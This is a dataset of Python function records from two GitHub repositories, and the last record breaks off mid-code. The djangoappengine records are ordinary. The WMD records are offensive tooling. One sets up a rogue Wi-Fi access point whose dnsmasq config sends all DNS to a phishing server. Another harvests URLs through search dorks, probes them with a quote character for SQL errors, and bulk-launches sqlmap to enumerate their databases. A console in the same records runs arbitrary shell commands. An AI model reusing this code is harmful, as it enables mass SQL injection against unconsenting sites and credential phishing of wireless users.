{"docstring": "\"\"\"\nDecorator that locks rows on DB reads.\n\"\"\"\n\n", "func_signal": "def commit_locked(func_or_using=None, retries=None, xg=False, propagation=None):\n", "code": "def inner_commit_locked(func, using=None):\n\n    def _commit_locked(*args, **kw):\n        from google.appengine.api.datastore import RunInTransactionOptions\n        from google.appengine.datastore.datastore_rpc import TransactionOptions\n\n        option_dict = {}\n\n        if retries:\n            option_dict['retries'] = retries\n\n        if xg:\n            option_dict['xg'] = True\n\n        if propagation:\n            option_dict['propagation'] = propagation\n\n        options = TransactionOptions(**option_dict)\n        return RunInTransactionOptions(options, func, *args, **kw)\n\n    return wraps(func)(_commit_locked)\n\nif func_or_using is None:\n    func_or_using = DEFAULT_DB_ALIAS\nif callable(func_or_using):\n    return inner_commit_locked(func_or_using, DEFAULT_DB_ALIAS)\nreturn lambda func: inner_commit_locked(func, func_or_using)", "path": "djangoappengine\\db\\utils.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"\nCaptures the program name, usually \"manage.py\".\n\"\"\"\n", "func_signal": "def run_from_argv(self, argv):\n", "code": "self.progname = argv[0]\nsuper(Command, self).run_from_argv(argv)", "path": "djangoappengine\\management\\commands\\runserver.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test lt on float.\n", "func_signal": "def test_lt(self):\n", "code": "self.assertEquals(\n    [entity.floating_point\n     for entity in FieldsWithOptionsModel.objects\n        .filter(floating_point__lt=3.1).order_by('floating_point')],\n    [1.58, 2.6])\n\n# Test lt on integer.\nself.assertEquals(\n    [entity.integer for entity in FieldsWithOptionsModel.objects\n        .filter(integer__lt=3).order_by('integer')],\n    [1, 2])\n\n# Test filter on primary_key field.\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__lt='as').order_by('email')],\n    ['app-engine@scholardocs.com', ])\n\n # Filter on datetime.\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(time__lt=self.last_save_time).order_by('time')],\n    ['app-engine@scholardocs.com', 'sharingan@uchias.com',\n     'rinnengan@sage.de'])\n\n# Test ForeignKeys with id.\nself.assertEquals(\n    sorted([entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(foreign_key__lt=3)]),\n    ['app-engine@scholardocs.com', 'sharingan@uchias.com'])\n\n# And with instance.\nordered_instance = OrderedModel.objects.get(priority=2)\nself.assertEquals(\n    sorted([entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(foreign_key__lt=ordered_instance)]),\n    ['app-engine@scholardocs.com', 'sharingan@uchias.com'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"\nRegression test for #48 (in old BitBucket repository).\n\"\"\"\n", "func_signal": "def test_nullable_text(self):\n", "code": "entity = NullableTextModel(text=None)\nentity.save()\n\ndb_entity = NullableTextModel.objects.get()\nself.assertEquals(db_entity.text, None)", "path": "djangoappengine\\tests\\test_field_options.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"\nProvides default procedure for handling warmup requests on App\nEngine. Just add this view to your main urls.py.\n\"\"\"\n", "func_signal": "def warmup(request):\n", "code": "for app in settings.INSTALLED_APPS:\n    for name in ('urls', 'views', 'models'):\n        try:\n            import_module('%s.%s' % (app, name))\n        except ImportError:\n            pass\ncontent_type = 'text/plain; charset=%s' % settings.DEFAULT_CHARSET\nreturn HttpResponse(\"Warmup done.\", content_type=content_type)", "path": "djangoappengine\\views.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test range on float.\n", "func_signal": "def test_range(self):\n", "code": "self.assertEquals(\n    [entity.floating_point\n     for entity in FieldsWithOptionsModel.objects\n        .filter(floating_point__range=(2.6, 9.1))\n        .order_by('floating_point')],\n    [2.6, 5.3, 9.1])\n\n# Test range on pk.\nself.assertEquals(\n    [entity.pk for entity in FieldsWithOptionsModel.objects\n        .filter(pk__range=('app-engine@scholardocs.com',\n                          'rinnengan@sage.de'))\n        .order_by('pk')],\n    ['app-engine@scholardocs.com', 'rasengan@naruto.com',\n     'rinnengan@sage.de'])\n\n# Test range on date/datetime objects.\nstart_time = self.last_save_datetime - datetime.timedelta(minutes=1)\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(time__range=(start_time, self.last_save_time))\n        .order_by('time')],\n    ['app-engine@scholardocs.com', 'sharingan@uchias.com',\n     'rinnengan@sage.de', 'rasengan@naruto.com'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Additionally tests count :)\n", "func_signal": "def test_chained_filter(self):\n", "code": "self.assertEquals(FieldsWithOptionsModel.objects.filter(\n    floating_point__lt=5.3, floating_point__gt=2.6).count(), 0)\n\n# Test across multiple columns. On App Engine only one filter\n# is allowed to be an inequality filter.\nself.assertEquals(\n    [(entity.floating_point, entity.integer)\n     for entity in FieldsWithOptionsModel.objects\n        .filter(floating_point__lte=5.3, integer=2)\n        .order_by('floating_point')],\n    [(2.6, 2), ])\n\n# Test multiple filters including the primary_key field.\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__gte='rinnengan@sage.de', integer=2)\n        .order_by('email')],\n    ['sharingan@uchias.com', ])\n\n# Test in filter on primary key with another arbitrary filter.\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__in=['rinnengan@sage.de',\n                           'sharingan@uchias.com'],\n                integer__gt=2)\n        .order_by('integer')],\n    ['rinnengan@sage.de', ])\n\n# Test exceptions.\n\n# Test multiple filters exception when filtered and not ordered\n# against the first filter.\nself.assertRaises(\n    DatabaseError,\n    lambda: FieldsWithOptionsModel.objects\n        .filter(email__gte='rinnengan@sage.de', floating_point=5.3)\n        .order_by('floating_point')[0])\n\n# Test exception if filtered across multiple columns with\n# inequality filter.\nself.assertRaises(\n    DatabaseError,\n    FieldsWithOptionsModel.objects\n        .filter(floating_point__lte=5.3, integer__gte=2)\n        .order_by('floating_point').get)\n\n# Test exception if filtered across multiple columns with\n# inequality filter with exclude.\nself.assertRaises(\n    DatabaseError,\n    FieldsWithOptionsModel.objects\n        .filter(email__lte='rinnengan@sage.de')\n        .exclude(floating_point__lt=9.1).order_by('email').get)\n\nself.assertRaises(\n    DatabaseError,\n    lambda: FieldsWithOptionsModel.objects\n        .all().exclude(floating_point__lt=9.1).order_by('email')[0])\n\n# TODO: Maybe check all possible exceptions.", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"Alternative solution instead of using iptables.\"\"\"\n# dnsmasq.conf\n", "func_signal": "def dnsmasq_captive():\n", "code": "dnsconf = ('interface=' + sop.int_mon + '\\n')\ndnsconf += ('dhcp-range=10.0.0.10,10.0.0.250,12h' + '\\n')\ndnsconf += ('dhcp-option=3,10.0.0.1' + '\\n')\ndnsconf += ('dhcp-option=6,10.0.0.1' + '\\n')\ndnsconf += ('server=8.8.8.8' + '\\n')\ndnsconf += ('log-queries' + '\\n')\ndnsconf += ('log-dhcp' + '\\n')\ndnsconf += ('no-hosts' + '\\n')\ndnsconf += ('no-resolv' + '\\n')\ndnsconf += ('address=/#/' + sop.webphis)\nwith open('tmp/dnsmasq.conf', 'w') as file:\n    file.write(dnsconf)\nos.system('killall dnsmasq')\ncomm.runCommand('dnsmasq -C tmp/dnsmasq.conf -d', 'dnsmasq')", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"The main run function.\"\"\"\n", "func_signal": "def run():\n", "code": "try:\n    # kill instances of hostapd and dnsmasq\n    cleanup_system()\n    iptables_allow_access()\n\n    # dnsmasq.conf\n    dnsconf = ('interface=' + sop.int_mon + '\\n')\n    dnsconf += ('dhcp-range=10.0.0.10,10.0.0.250,12h' + '\\n')\n    dnsconf += ('dhcp-option=3,10.0.0.1' + '\\n')\n    dnsconf += ('dhcp-option=6,10.0.0.1' + '\\n')\n    dnsconf += ('server=8.8.8.8' + '\\n')\n    dnsconf += ('log-queries' + '\\n')\n    dnsconf += ('log-dhcp' + '\\n')\n    dnsconf += ('no-hosts' + '\\n')\n    dnsconf += ('no-resolv' + '\\n')\n    # dnsconf += ('address=/#/' + sop.webphis)\n    with open('tmp/dnsmasq.conf', 'w') as file:\n        file.write(dnsconf)\n\n    # fakehosts.conf\n    # fakehosts = '192.168.1.1 nonhttp.com'\n\n    # hostapd.conf\n    hostapd = ('interface=' + sop.int_mon + '\\n')\n    hostapd += ('driver=nl80211' + '\\n')\n    hostapd += ('ssid=' + sop.ssid + '\\n')\n    hostapd += ('channel=' + sop.channel + '\\n')\n    hostapd += ('logger_syslog=-1' + '\\n')\n    hostapd += ('logger_syslog_level=2' + '\\n')\n    with open('tmp/hostapd.conf', 'w') as file:\n        file.write(hostapd)\n\n    comm.runCommand('dnsmasq -C tmp/dnsmasq.conf -d', 'dnsmasq')\n    comm.runCommand2('hostapd ./tmp/hostapd.conf', 'hostapd')\n\n    print('   -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'phisAP:' + bc.ENDC + ' Press Ctrl+c to exit')\n\n    check_connections()\n\n    cleanup_system()\n    cleanup_iptables()\n\nexcept KeyboardInterrupt:\n    cleanup_system()\n    cleanup_iptables()", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Info.\"\"\"\n", "func_signal": "def info():\n", "code": "print(\"\\n\\n\" + bc.HEADER)\nprint(\"  .---.  .---.     .-''-.    .---.     .-------.         ,---.    ,---.    .-''-.   \")\nprint(\"  |   |  |_ _|   .'_ _   \\   | ,_|     \\  _(`)_ \\        |    \\  /    |  .'_ _   \\  \")\nprint(\"  |   |  ( ' )  / ( ` )   ',-./  )     | (_ o._)|        |  ,  \\/  ,  | / ( ` )   ' \")\nprint(\"  |   '-(_{;}_). (_ o _)  |\\  '_ '`)   |  (_,_) /        |  |\\_   /|  |. (_ o _)  | \")\nprint(\"  |      (_,_) |  (_,_)___| > (_)  )   |   '-.-'         |  _( )_/ |  ||  (_,_)___| \")\nprint(\"  | _ _--.   | '  \\   .---.(  .  .-'   |   |             | (_ o _) |  |'  \\   .---. \")\nprint(\"  |( ' ) |   |  \\  `-'    / `-'`-'|___ |   |             |  (_,_)  |  | \\  `-'    / \")\nprint(\"  (_{;}_)|   |   \\       /   |        \\/   )             |  |      |  |  \\       /  \")\nprint(\"  '(_,_) '---'    `'-..-'    `--------``---'             '--'      '--'   `'-..-'   \")\nprint(\"\\n\\n\" + bc.ENDC)\nprint(\"  This python script is developed to show, how many vulnerables websites,\")\nprint(\"  which are laying around on the web. The main focus of the script is to\")\nprint(\"  generate a list of vuln urls. Please use the script with causing and\")\nprint(\"  alert the webadmins of vulnerable pages. The SQLmap implementation is\")\nprint(\"  just for showcasing.\")\nprint(\"\")\nprint(\"  The script is divided into 3 main sections.\\n\")\nprint(bc.BOLD + \"  # Section 1\" + bc.ENDC)\nprint(\"    In this section you have to provide a search string, which 'connects' to\")\nprint(\"    the websites database, e.g. 'php?id='. The script then crawls\")\nprint(\"    Bing or Google for urls containing it. All of the urls can then be saved\")\nprint(\"    into a file. (Please be aware that you might get banned for crawling to\")\nprint(\"    fast, remember an appropriate break/sleep between request).\")\nprint(bc.ITALIC + \"    Example of searchs: php?bookid=, php?idproduct=, php?bookid=, php?catid=,\")\nprint(\"                        php?action=, php?cart_id=, php?title=, php?itemid=\" + bc.ENDC)\nprint(\"\")\nprint(bc.BOLD + \"  # Section 2\" + bc.ENDC)\nprint(\"    This section adds a qoute ' to the websites url. If the website is\")\nprint(\"    prone to SQL injection, we'll catch this with some predefined error\")\nprint(\"    messages. The script will not add websites for blind SQL injections,\")\nprint(\"    due to the predefined error messages.\")\nprint(\"\")\nprint(bc.BOLD + \"  # Section 3\" + bc.ENDC)\nprint(\"    This is just an activation of sqlmap with the bulk argument and no\")\nprint(\"    user interaction for validation of SQL injection.\")\nprint(\"\")\nprint(\"\\n\")\nprint(bc.BOLD + \"      Stay safe and help the vulnerables\" + bc.ENDC)\nprint(\"\\n\")\nsys.exit()", "path": "modules\\sql\\gdorksqli.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Main console.\"\"\"\n", "func_signal": "def console():\n", "code": "valueQ = input('  ' + bc.FAIL + 'mdw' + bc.ENDC + '@' + bc.FAIL + 'gdsqli:' + bc.ENDC + ' ')\nuserinput = valueQ.split()\nif 'so' in userinput[:1]:\n    sop.show_opt()\nelif 'sa' in userinput[:1]:\n    sop.show_all()\nelif 'help' in userinput[:1]:\n    print('\\n\\n###########################################################')\n    print('#  SQLmap')\n    print('###########################################################\\n')\n    os.system(sqlmap + ' --help')\n    print('\\n\\n###########################################################\\n\\n')\nelif 'info' in userinput[:1]:\n    info()\nelif 'run' in userinput[:1]:\n    run()\nelif 'set' in userinput[:1]:\n    useroption = str(userinput[1:2]).strip('[]\\'')\n    uservalue = str(userinput[2:3]).strip('[]\\'')\n    if useroption not in sop.poss_opt():\n        print(bc.WARN + '\\n    Error, no options for: ' + useroption + '\\n' + bc.ENDC)\n    elif useroption in sop.poss_opt():\n        setattr(sop, useroption, uservalue)\n        print('\\n      ' + useroption + '\\t> ' + uservalue + '\\n')\nelif 'invoke' in userinput[:1]:\n    comm.invokeModule(options.Call)\n    return None\nelif 'back' in userinput[:1] or 'exit' in userinput[:1]:\n    return None\nelse:\n    print(bc.WARNING + '\\n    error\\t> ' + str(userinput[:1]) + '\\n' + bc.ENDC)\n# Always return to console:\nconsole()", "path": "modules\\sql\\gdorksqli.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Define variables and show options on run.\"\"\"\n", "func_signal": "def __init__(self, basesearch, searchprovider, maxperpage, maxpages, startpage, timeout, savesearch, filename, verboseactive):\n", "code": "self.basesearch = basesearch\nself.searchprovider = searchprovider\nself.maxperpage = maxperpage\nself.maxpages = maxpages\nself.startpage = startpage\nself.timeout = timeout\nself.savesearch = savesearch\nself.filename = filename\nself.verboseactive = verboseactive\nself.show_all()", "path": "modules\\sql\\gdorksqli.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Cleaning up rules in iptables.\"\"\"\n", "func_signal": "def cleanup_iptables():\n", "code": "os.system('iptables -P INPUT ACCEPT')\nos.system('iptables -P FORWARD ACCEPT')\nos.system('iptables -P OUTPUT ACCEPT')\nos.system('iptables -t nat -P PREROUTING ACCEPT')\nos.system('iptables -t nat -P POSTROUTING ACCEPT')\nos.system('iptables -t nat -P OUTPUT ACCEPT')\nos.system('iptables -t mangle -P PREROUTING ACCEPT')\nos.system('iptables -t mangle -P OUTPUT ACCEPT')\nos.system('iptables -F')\nos.system('iptables -X')\nos.system('iptables -t nat -F')\nos.system('iptables -t nat -X')\nos.system('iptables -t mangle -F')\nos.system('iptables -t mangle -X')", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Show the possible options.\"\"\"\n", "func_signal": "def show_opt(self):\n", "code": "print(\n    ''\n    '\\n\\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC +\n    '\\n\\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------')) +\n    '\\n\\t' + ('%-*s %-*s %-*s %s' % (15, 'int_net:', 8, 'y', 18, self.int_net, 'Interface with internet access')) +\n    '\\n\\t' + ('%-*s %-*s %-*s %s' % (15, 'int_mon:', 8, 'n', 18, self.int_mon, 'Interface for creating AP')) +\n    '\\n\\t' + ('%-*s %-*s %-*s %s' % (15, 'webphis:', 8, 'n', 18, self.webphis, 'IP for phising attack (checkout the module \"webphis\")')) +\n    '\\n\\t' + ('%-*s %-*s %-*s %s' % (15, 'ssid:', 8, 'n', 18, self.ssid, 'AP name')) +\n    '\\n\\t' + ('%-*s %-*s %-*s %s' % (15, 'channel:', 8, 'n', 18, self.channel, 'Channel for AP')) +\n    '\\n'\n)", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"The main console for the module.\"\"\"\n", "func_signal": "def console():\n", "code": "value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'phisAP:' + bc.ENDC + ' ')\nuserinput = value.split()\n# Show options\nif 'so' in userinput[:1]:\n    sop.show_opt()\n# Show all info\nelif 'sa' in userinput[:1]:\n    sop.show_all()\n# Run module\nelif 'run' in userinput[:1]:\n    run()\n# Set options\nelif 'set' in userinput[:1]:\n    useroption = str(userinput[1:2]).strip('[]\\'')  # The parameter to set\n    uservalue = str(userinput[2:3]).strip('[]\\'')  # Use single word after \"set parameter\" to set parameter\n    # uservalue = value.split(' ', 2)[2]  # Use all text after \"set parameter\"\n    if useroption not in sop.poss_opt():\n        print(bc.WARN + '\\n    Error, no options for: ' + useroption + '\\n' + bc.ENDC)\n    elif useroption in sop.poss_opt():\n        setattr(sop, useroption, uservalue)\n        print('\\n      ' + useroption + '\\t> ' + uservalue + '\\n')\n# Open module in new window\nelif 'invoke' in userinput[:1]:\n    comm.invokeModule(Options.Call)\n    return None\n# Go back to WMDframe console\nelif 'back' in userinput[:1] or 'exit' in userinput[:1]:\n    return None\n# Run command\nelif ':' in userinput[:1]:\n    print('')\n    os.system(str(value[1:]))\n    print('')\n# Show info\nelif 'info' in userinput[:1]:\n    info()\nelse:\n    command = str(userinput[:1]).strip('[]\\'')\n    print(bc.WARN + '\\n    Error, no options for: ' + command + '\\n' + bc.ENDC)\nconsole()", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Show the possible commands.\"\"\"\n", "func_signal": "def show_commands(self):\n", "code": "print(\n    ''\n    '\\n\\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +\n    '\\n\\t' + '---------' +\n    '\\n\\t' + ('%-*s ->\\t%s' % (9, 'run', 'Run the script')) +\n    '\\n\\t' + ('%-*s ->\\t%s' % (9, 'info', 'Information')) +\n    '\\n\\t' + ('%-*s ->\\t%s' % (9, 'so', 'Show options')) +\n    '\\n\\t' + ('%-*s ->\\t%s' % (9, 'sa', 'Show module info')) +\n    '\\n\\t' + ('%-*s ->\\t%s' % (9, 'set', 'Set options, set [PARAMETER] [VALUE]')) +\n    '\\n\\t' + ('%-*s ->\\t%s' % (9, 'invoke', 'Invoke module')) +\n    '\\n\\t' + ('%-*s ->\\t%s' % (9, 'exit', 'Exit')) +\n    '\\n'\n)", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Define variables and show options on run.\"\"\"\n", "func_signal": "def __init__(self, int_net, int_mon, webphis, ssid, channel):\n", "code": "self.int_net = int_net\nself.int_mon = int_mon\nself.webphis = webphis\nself.ssid = ssid\nself.channel = channel\nself.show_all()", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Get random user agents.\"\"\"\n# uafile : string, path to text file of user agents, one per line\n", "func_signal": "def LoadUserAgents(uafile='files/user_agents.txt'):\n", "code": "uas = []\nwith open(uafile, 'rb') as uaf:\n    for ua in uaf.readlines():\n        if ua:\n            uas.append(ua.strip()[1:-1-1])\nrandom.shuffle(uas)\nreturn uas", "path": "modules\\sql\\gdorksqli.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Load the logging config file.\"\"\"\n", "func_signal": "def log():\n", "code": "try:\n    fileConfig('core/config_logging.ini')\nexcept:\n    fileConfig('config_logging.ini')\nreturn logging.getLogger()", "path": "core\\core.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Clean iptables after use.\"\"\"\n", "func_signal": "def cleanup_system():\n", "code": "os.system('killall dnsmasq')\nos.system('killall hostapd')\ntry:\n    os.remove('tmp/dnsmasq.conf')\nexcept:\n    pass\ntry:\n    os.remove('tmp/hostapd.conf')\nexcept:\n    pass", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Scan URLs with SQLmap.\"\"\"\n", "func_signal": "def scan_urls_sqlmap(filename_vulnurl):\n", "code": "print('\\n\\n\\n' + bc.HEADER)\nprint('\\t[*] Starting SQLmap')\nprint('\\n' + bc.ENDC)\n\n# =================================\n# Check if sqlmap installed, file, etc.\n# =================================\n\nif shutil.which('sqlmap') is None:\n    print('\\t[!] SQLmap is not installed on system - can\\'t go on.')\n    print('\\t[!] Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)')\n    print('\\n\\t[!] Command:')\n    print('\\t[*] ' + sqlmap + ' -m \\'' + filename_vulnurl + '\\n')\nelse:\n    if filename_vulnurl == '0':\n        print('\\t[!] No filename in memory, please specify.')\n        return None\n\nprint(bc.ENDC + '\\t[*] SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.')\n\nfileDestination = (os.getcwd() + '/' + filename_vulnurl)\ncommand = (sqlmap + ' -m ' + fileDestination + ' --dbs --batch --random-agent --threads 4')\nprint('\\t[*] Command to execute: ' + command)\nprint(bc.BOLD + '\\t[*] Press Ctrl + c to exit\\n\\n\\n')\n\n# RUN SQLMAP !!\nos.system(command)\n\n# Not implemented - specify saving destination\n# @type  savingplace: str\n# @param savingplace: Who should perform the search.\n# savingplace = input(bc.ENDC + '  Specify folder where results will be placed: ' + bc.OKBLUE)\n# if savingplace not in ('b', 'g'):\n#    print(bc.WARNING + '  - Wrong input - only 'b' and 'g' allowed. Using 'b'')\n#    savingplace = 'b'", "path": "modules\\sql\\gdorksqli.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Show all options.\n\nSending main options to the core module modules.py for parsing.\n\"\"\"\n", "func_signal": "def show_all(self):\n", "code": "cmodules.showModuleData(\n    Options.Author,\n    Options.Name,\n    Options.Call,\n    Options.Category,\n    Options.Type,\n    Options.Version,\n    Options.Description,\n    Options.License,\n    Options.Datecreation,\n    Options.Lastmodified\n)\nself.show_commands()\nself.show_opt()", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Check if URLs are vuln to SQLi.\"\"\"\n", "func_signal": "def check_urls_for_vuln(filename, filename_rawurl, savesearch, verboseactive):\n", "code": "print('\\n\\n\\n' + bc.HEADER)\nprint('\\t[*] Checking URLs for vuln')\nprint('\\n' + bc.ENDC)\n\n# Base input\nif filename_rawurl != '0':\n    urlfile = filename_rawurl\n\nif not os.path.isfile(urlfile):\n    print(bc.FAIL + '\\t[*] URL file does not exist or no vuln urls.')\n    print(bc.FAIL + '  Exiting')\n    return None\n\nif savesearch == 'y':\n    if not os.path.isfile(filename):\n        os.mknod(filename)\n    else:\n        print('\\t[!]  File already exists!')\n        print('\\t[!]  Append to file? Press enter for yes. (y/n)')\n        appendtofile = input('\\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'fileExists:' + bc.ENDC + ' ')\n        if appendtofile == 'n':\n            print('\\t[!] User disallowed appending to resultfile')\n            print('\\t[!] Please try again with another filename')\n            print('\\t[!] Exiting\\n\\n')\n            return None\nelse:\n    filename = '0'\n\nprint(bc.ENDC + '\\n\\t[*]::Reading file\\n')\nprint('\\t[*]  Connecting\\n')\n\n# =================================\n# Loop through urls and add a qoute\n# =================================\n\nwith open(urlfile) as fileorg:\n    for line in fileorg:\n        checkMY1 = 0\n        checkMY2 = 0\n        checkMY3 = 0\n        checkMY4 = 0\n        checkMS1 = 0\n        checkMS2 = 0\n        checkMS3 = 0\n        checkOR1 = 0\n        checkOR2 = 0\n        checkOR3 = 0\n        checkPO1 = 0\n        checkPO2 = 0\n        try:\n            # Get data\n            url = line + \"'\"\n            print(\n                '\\t[' +\n                time.strftime('%H:%M:%S') +\n                ']  [*]  ' + line.strip('\\n')\n            )\n            # Loading random useragent\n            uas = LoadUserAgents()\n            ua = random.choice(uas)  # select a random user agent\n            headers = {'Connection': 'close', 'User-Agent': ua}\n            r = requests.get(url, headers=headers)\n            soup = BeautifulSoup(r.text, 'lxml')\n\n            # Check if vuln - might updated indicationstrings according to\n            # MySQL\n            checkMY1 = len(soup.find_all(text=re.compile('check the manual that corresponds to your MySQL')))\n            checkMY2 = len(soup.find_all(text=re.compile('SQL syntax')))\n            checkMY3 = len(soup.find_all(text=re.compile('server version for the right syntax')))\n            checkMY4 = len(soup.find_all(text=re.compile('expects parameter 1 to be')))\n            # Microsoft SQL server\n            checkMS1 = len(soup.find_all(text=re.compile('Unclosed quotation mark before the character string')))\n            checkMS2 = len(soup.find_all(text=re.compile('An unhanded exception occurred during the execution')))\n            checkMS3 = len(soup.find_all(text=re.compile('Please review the stack trace for more information')))\n            # Oracle Errors\n            checkOR1 = len(soup.find_all(text=re.compile('java.sql.SQLException: ORA-00933')))\n            checkOR2 = len(soup.find_all(text=re.compile('SQLExceptionjava.sql.SQLException')))\n            checkOR3 = len(soup.find_all(text=re.compile('quoted string not properly terminated')))\n            # Postgre SQL\n            checkPO1 = len(soup.find_all(text=re.compile('Query failed:')))\n            checkPO2 = len(soup.find_all(text=re.compile('unterminated quoted string at or near')))\n\n            # Verbose level 1\n            if verboseactive == '1':\n                print('\\t[V]  Check1 MySQL found:    ' + str(checkMY1))\n                print('\\t[V]  Check2 MySQL found:    ' + str(checkMY2))\n                print('\\t[V]  Check3 MySQL found:    ' + str(checkMY3))\n                print('\\t[V]  Check4 MySQL found:    ' + str(checkMY4))\n                print('\\t[V]  Check5 MS SQL found:   ' + str(checkMS1))\n                print('\\t[V]  Check6 MS SQL found:   ' + str(checkMS2))\n                print('\\t[V]  Check7 MS SQL found:   ' + str(checkMS3))\n                print('\\t[V]  Check8 Oracle found:   ' + str(checkOR1))\n                print('\\t[V]  Check9 Oracle found:   ' + str(checkOR2))\n                print('\\t[V]  Check10 Oracle found:  ' + str(checkOR3))\n                print('\\t[V]  Check11 Postgre found: ' + str(checkPO1))\n                print('\\t[V]  Check12 Postgre found: ' + str(checkPO2))\n\n            # Verbose level 2\n            if verboseactive == '2':\n                checkverMY1 = soup.find(text=re.compile('check the manual that corresponds to your MySQL'))\n                checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))\n                checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))\n                checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))\n                print('\\t[V]  Check1 MySQL found:    ' + str(checkverMY1).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check2 MySQL found:    ' + str(checkverMY2).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check3 MySQL found:    ' + str(checkverMY3).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check4 MySQL found:    ' + str(checkverMY4).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n\n                checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))\n                checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))\n                checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))\n                print('\\t[V]  Check5 MS SQL found:   ' + str(checkverMS1).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check6 MS SQL found:   ' + str(checkverMS2).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check7 MS SQL found:   ' + str(checkverMS3).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n\n                checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))\n                checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))\n                checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))\n                print('\\t[V]  Check8 Oracle found:   ' + str(checkverOR1).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check9 Oracle found:   ' + str(checkverOR2).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check10 Oracle found:  ' + str(checkverOR3).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n\n                checkverPO1 = 